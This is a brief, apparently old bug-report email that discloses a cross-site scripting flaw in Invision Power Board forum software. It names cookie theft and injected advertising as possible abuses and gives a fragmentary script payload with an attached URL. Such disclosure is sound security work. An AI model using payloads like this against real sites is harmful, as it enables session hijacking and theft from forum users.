Subject: bug in Invision Power Board




I found possibility to run Script (java Script, VBScript) on the system 
Invision Power Board...
It's possible to do if it much {many} things like a withdrawal of cookie, 
advertising ....


For example:

(window.location.search.substring
(78));&lt;/script&gt;<http://binaryvision.tech.nu?BoyBear$$$From$$$BinaryVision
